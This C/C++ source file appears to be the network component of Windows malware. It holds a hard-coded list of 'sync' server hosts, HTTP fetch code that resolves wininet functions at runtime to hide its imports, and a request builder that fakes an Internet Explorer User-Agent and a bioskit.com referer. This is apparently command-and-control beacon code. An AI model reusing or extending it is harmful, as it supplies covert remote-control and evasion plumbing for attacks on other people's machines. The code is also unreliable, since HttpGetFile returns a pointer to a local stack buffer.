#include "JSON.h"
#include "PassX.h"
#include "ServerUrl.h"

CHAR g_szServerUrl[MAX_PATH] = "{\"sync\":{\"host1\":\"127.0.0.1\",\"host2\":\"127.0.0.1\",\"host3\":\"127.0.0.1\",\"host4\":\"192.168.204.131\"}}";
WCHAR *g_wStrConfig = NULL;
LPSTR g_ServerIp = NULL;


char* HttpGetFile(CHAR Url[])
{
	HMODULE hDll;
	LPVOID hInternet,hUrlHandle; 
	char buf[1000],*pBuf;
	pBuf=buf;
	DWORD dwFlags;

	hDll = LoadLibrary(L"wininet.dll");
	if(hDll)
	{
		pInternetOpen MyInternetOpen = NULL;
		pInternetOpenUrl MyInternetOpenUrl = NULL;
		pInternetCloseHandle MyInternetCloseHandle = NULL;
		pInternetReadFile MyInternetReadFile = NULL;

		MyInternetOpen = (pInternetOpen) GetProcAddress(hDll,"InternetOpenA");
		MyInternetOpenUrl = (pInternetOpenUrl)GetProcAddress(hDll,"InternetOpenUrlA");
		MyInternetCloseHandle = (pInternetCloseHandle)GetProcAddress(hDll,"InternetCloseHandle");
		MyInternetReadFile = (pInternetReadFile)GetProcAddress(hDll,"InternetReadFile");

		hInternet = MyInternetOpen("baks",0, NULL, NULL, 0);
		if (hInternet != NULL)
		{
			hUrlHandle = MyInternetOpenUrl(hInternet,Url,NULL,0,0x04000000,0);
			if (hUrlHandle!= NULL)
			{
				memset(buf,0,1000);
				MyInternetReadFile(hUrlHandle,buf,999,&dwFlags);
				MyInternetCloseHandle(hUrlHandle);
				hUrlHandle = NULL;
			}
			MyInternetCloseHandle(hInternet);
			hInternet = NULL;
		}
		FreeLibrary(hDll);
		return pBuf;
	}
	else
		return NULL;
}
BOOLEAN GetSyncIp(WCHAR *wServerIp)
{
	BOOL bRet = FALSE;

	WCHAR strSync[] = {L"sync"};
	WCHAR strHost[MAX_PATH];

	RtlZeroMemory(strHost,sizeof(WCHAR) * MAX_PATH);

	g_wStrConfig = (WCHAR *)LocalAlloc(LPTR,(strlen(g_szServerUrl) + 2) * sizeof(WCHAR));
	_snwprintf_s(g_wStrConfig,strlen(g_szServerUrl) + 1,_TRUNCATE,L"%S",g_szServerUrl);

	JSONValue *jValue = JSON::Parse(g_wStrConfig);
	if (jValue != NULL && jValue->IsObject())
	{
		JSONObject jRoot = jValue->AsObject();
		if (jRoot.find(strSync) != jRoot.end() && jRoot[strSync]->IsObject())
		{
			JSONObject jSync = jRoot[strSync]->AsObject();
			int i = 1;
			do 
			{
				StringCchPrintf(strHost,MAX_PATH,L"host%d",i);
				if (jSync.find(strHost) != jSync.end() && jSync[strHost]->IsString())
				{
					StringCchCat(wServerIp,MAX_PATH,jSync[strHost]->AsString().c_str());
					StringCchCat(wServerIp,MAX_PATH,L"++");
					//_snprintf_s(strIp, 100, _TRUNCATE, "%S", jSync[strHost]->AsString().c_str());
					bRet = TRUE;
				}
				i++;
			} while (i <= SERVER_URL_MAXIMUM);
		}
	}

	if (jValue)
	{
		delete jValue;
	}
#ifdef _DEBUG
	if (bRet == FALSE)
	{
		OutputDebugString(L"[!!] GetSyncIp Fail!!");
		__asm int 3;
	}
#endif
	return bRet;
}
int GetHttpHead(char *buf,char *myurl)
{
	char *tmp = buf;
	int len = 0;
	len = sprintf(tmp,"GET %s HTTP/1.1\r\n", myurl);
	tmp += len;
	len = sprintf(tmp,"Accept: text/html, application/xhtml+xml, */*\r\n");
	tmp += len;
	len = sprintf(tmp,"Referer: http://www.bioskit.com/\r\n");
	tmp += len;
	len = sprintf(tmp,"Accept-Language: zh-CN\r\n");
	tmp += len;
	len = sprintf(tmp,"User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\r\n");
	tmp += len;
	len = sprintf(tmp,"Content-Type: application/x-www-form-urlencoded\r\n");
	tmp += len;
	len = sprintf(tmp,"Connection: close\r\n");
	tmp += len;
	len = sprintf(tmp,"Cache-Control: no-cache\r\n");
	tmp += len;
	len = sprintf(tmp,"\r\n");
	tmp += len;
	return tmp - buf ;
}